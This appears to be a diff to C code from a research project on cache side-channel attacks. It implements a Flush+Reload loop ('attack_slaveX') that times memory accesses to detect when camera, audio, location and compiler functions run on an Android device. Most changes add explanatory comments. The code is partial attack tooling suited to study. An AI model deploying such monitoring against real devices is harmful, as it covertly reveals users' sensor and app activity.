@@ -66,7 +66,7 @@ attack_slaveX(libflush_session_t *libflush_session,  int sum_length, pthread_mut
     int length = compiler_position;
     while(1) {
         size_t count;
-        if(turns>=100000){
+        if(turns>=100000){//get 100000 runs, stop the compiler scan
             LOGD("Turns %d",turns);
             length = compiler_position;
             turns = 0;
@@ -75,29 +75,29 @@ attack_slaveX(libflush_session_t *libflush_session,  int sum_length, pthread_mut
             if(addr[j]==0)
                 continue;
             if(j==2) continue;
-            if (j == 1) {
+            if (j == 1) {//scan list of camera and audio
                 for (int i = 0; i < length_of_camera_audio[0]; i++) {
                     void* target = (void *) *((size_t *) addr[1] + i);
                     if (target == 0) {//if the target is 0, skip it.
                         continue;
                     }
-                    count = libflush_reload_address_and_flush(libflush_session, target);
+                    count = libflush_reload_address_and_flush(libflush_session, target);//load the address into cache set and flush out to get the count
                     if (count <= threshold) {
                         gettimeofday(&tv, NULL);
                         LOGD("Camera hit %d-%d-%d.", j, i, count);
                         //compiler
-                        logs[*log_length] = 10000+i;
+                        logs[*log_length] = 10000+i;//1XXXX means camera set(it's only for our data collection and analysis)
                         times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
-                        thresholds[*log_length] = count;
+                        thresholds[*log_length] = count; //record the count in thresholds list
 
                         pthread_mutex_lock(g_lock);
                         *log_length = (*log_length+1)%99000;
-                        camera_pattern[i] = 1;
-                        flags[j] = 1;
+                        camera_pattern[i] = 1; //mark the activated pattern
+                        flags[j] = 1; //flag to denote activation
                         pthread_mutex_unlock(g_lock);
                     }
                 }
-                for (int i = 0; i < length_of_camera_audio[1]; i++) {
+                for (int i = 0; i < length_of_camera_audio[1]; i++) {//the same as above
                     void* target = (void *) *((size_t *) addr[j+1] + i);
                     if (target == 0) {//if the target is 0, skip it.
                         continue;
@@ -107,7 +107,7 @@ attack_slaveX(libflush_session_t *libflush_session,  int sum_length, pthread_mut
                         gettimeofday(&tv, NULL);
                         LOGD("Audio hit %d-%d-%d.", j+1,i, count);
                         //compiler
-                        logs[*log_length] = 20000+i;
+                        logs[*log_length] = 20000+i;//2XXXX means camera set(it's only for our data collection and analysis)
                         times[*log_length] = tv.tv_sec * 1000 + tv.tv_usec / 1000;
                         thresholds[*log_length] = count;
 
@@ -137,7 +137,7 @@ attack_slaveX(libflush_session_t *libflush_session,  int sum_length, pthread_mut
                         *log_length = (*log_length+1)%99000;
                         flags[j] = 1;
                         pthread_mutex_unlock(g_lock);
-                        if (j == 4) {
+                        if (j == 4) {//if j=4 and count<thresh, we will include the compiler functions.(0 for query,1 for camera, 2 for audio, 3 for location ,4-sum_length is the compiler function)
                             length = sum_length;
                         }
                     }
@@ -405,9 +405,7 @@ int get_threshold(){
     libflush_session_t* libflush_session;
     libflush_init(&libflush_session, NULL);
     /* Start calibration */
-    //if (threshold == 0) {//try to get 3 times
-        //fprintf(stdout, "[x] Start calibration... ");
-    threshold = calibrate(libflush_session); //get the threshold
+    threshold = calibrate(libflush_session);//calibrate the threshold
     LOGD("Currently the threshold is %d",threshold);
     if(threshold==9999)
         return threshold;
@@ -416,19 +414,8 @@ int get_threshold(){
     libflush_terminate(libflush_session);
     return threshold;
 }
-/*
-void flush_address(size_t* address,int length){
-    libflush_session_t* libflush_session;
-    libflush_init(&libflush_session, NULL);
-    for(int i=0;i<length;i++){
-        if(address[i]!=0) {
-            libflush_reload_address_and_flush(libflush_session, address[i]);
-        }
-    }
-    LOGD("Clear Cache Scan");
-    libflush_terminate(libflush_session);
-}
-*/
+
+
 //when use static, the location function keeps poping
 static void
 attack_slave(libflush_session_t *libflush_session,  int sum_length, pthread_mutex_t *g_lock, int compiler_position,
